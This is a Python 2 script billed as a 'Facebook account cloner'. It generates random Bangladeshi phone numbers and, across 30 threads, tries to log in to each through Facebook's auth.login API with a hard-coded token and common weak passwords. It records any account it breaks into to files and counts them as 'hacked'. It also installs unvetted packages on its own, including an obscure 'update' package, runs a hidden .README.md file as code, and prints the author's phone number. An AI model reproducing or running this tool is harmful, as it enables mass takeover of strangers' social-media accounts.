import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(20000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print (nmbr)
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser() 
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully thanku somi'
    os.sys.exit()


def exxb():
    print '[!] \x1b[1;91mTHIS OPTION NOT AVAILABLE AT THE MOMENT.BUT \x1b[3;92;40m COM\x1b[1;95mING SO\x1b[1;97mON \x1b[1;91m\x1b[0;34;40m'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;96m     [SOMI] \x1b[1;92mLoa\x1b[1;90mding \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.5)


def lodhirt():
    lodhirt = [
     'YOUR', '      ', 'DREAM', '           ', 'BOY', '      ', 'SOMI BRAND', '      ', 'MUNDA', '      ', 'SUCCESS', '      ', 'BLUE', '      ', 'PAINT ', '      ', 'DEATH', '      ', 'ROUTE', 'SOMI BRAND', '      ', 'TO', '      ', 'MUCH', '      ', 'ATTITUDE', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI BRAND', '      ', 'SOMI STAR BOY\n']
    for o in lodhirt:
        print '\r\x1b[1;94m                     \x1b[1;92m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


def jaalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(2.0 / 9900)


def t():
    time.sleep(1)


def cb():
    os.system('clear') 
logo = "\n\x1b[1;91m  _____    _____     __   __   _______\n\x1b[1;95m (_____)  (_____)   (__)_(__) (_______)\n\x1b[1;92m(_)___   (_)   (_) (_) (_) (_)   (_)   \n \x1b[1;91m (___)_ (_)   (_) (_) (_) (_)   (_)   \n\x1b[1;97m  ____(_)(_)___(_) (_)     (_) __(_)__ \n\x1b[1;92m (_____)  (_____)  (_)     (_)(_______)\n \x1b[1;90m    FACEBOOK ACCOUNT CLONER BY \x1b[3;90mSOMI BRAND\x1b[0;37;40m\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;95mDEVOLPER       : SOMI AWAN\n\x1b[3;92m\xe2\x96\xb8 \x1b[3;96mWHATSAPP NO   : +923455453538\n\x1b[1;92m\xe2\x96\xb8 \x1b[3;93mNOTE    : PLZ DON,T CALL ME ONLY TEXT\n\x1b[3;93m\xe2\x96\xb8 \x1b[1;90mNOTE     : USE FAST 4G SIM NET\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80"
back = 0
berhasil = []
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    lodhirt()
    print
    
    jalan('\x1b[1;92mDONT USE  AUTO  REPOT COMMAND ')
    jalan('\x1b[1;94m ONLY TIME WASTE')
    jalan('\x1b[1;95mSO I RECOMMEND YOU TO DONT USE IT')
    jalan('\x1b[1;96mBUT IF YOU WANT TO WASTE YOUR TIME THEN USE IT')
    jalan('\x1b[1;97mSOMI AA BRAND Ni')
    print
    jaalan('\x1b[1;92m[\x1b[1;92m1\x1b[1;91m]  \x1b[1;93mBANGLA 6 DIGIT CLONE')
    print
    jalan('\x1b[1;91m[\x1b[1;93m2\x1b[1;91m] \x1b[1;92mUPDATE \x1b[1;91m[\x1b[1;93m3\x1b[1;91m] \x1b[1;92mYOUTUBE \x1b[1;91m[\x1b[1;93m4\x1b[1;91m] \x1b[1;92mCONTACT FB\x1b[1;91m[\x1b[1;93m00\x1b[1;91m] \x1b[1;92mEXIT')
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\n \x1b[1;96m>   ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        tik()
        os.system('clear')
        print logo
        print
        try:
            c = raw_input('TYPE ANY 3 DIGIT NUMBER \n\n\x1b[1;93m TYPE ANY CODE FROM\n : 175,165,191, 192, 193, 194, 195, 196, 197, 198, 199\n')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()
    elif bch == '2':
        tik()
        os.system('clear')
        os.system('pip2 install --upgrade bababindsix')
        os.system('clear')
        print logo
        print
        psb(' Tool has been successfully updated')
        time.sleep(1)
        os.system('python2 .README.md')
        menu()
    elif bch == '3':
        os.system('xdg-open https://youtu.be/rIrkabj-EW8 ')
        time.sleep(1)
        menu()
    elif bch == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100041349421055 ')
        time.sleep(1)
        menu()
    elif bch == '00':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    print 47* '-'
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] TOTAL NUMBERS: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] PLEASE WAIT, PROCESS IS START ...')
    time.sleep(0.5)
    psb('[!] TO STOP THIS PROCESS PRESS Ctrl THEN Z')
    time.sleep(0.5)
    print 47* '-'
    print

    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(done)  ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/successful.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;97m(7Days) ' + k + c + user + '  |  ' + pass1
                    cps = open('out/super_cp.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Done)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/successful.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass2
                            cps = open('out/super_cp.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="000786"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Done)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/successful.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass3 
                                    cps = open('out/super_cp.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="786000"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(done)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/successful.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass4
                                            cps = open('out/super_cp.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="786786"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Done)  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/successful.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m(7days) ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('out/super_cp.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                                              
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 50 * '-'
    print '[\xe2\x9c\x93] \x1b[1;96mPROCESS HAS BEEN COMPLETED....'
    print '[\xe2\x9c\x93] \x1b[1;96mTOTAL HACKED/CHECKPOINT : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] \x1b[1;96mCP FILE HAS BEEN SAVED : mout/checkpoint.txt'
    raw_input('\n[\x1b[1;96mPRESS ENTER TO GO BACK]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
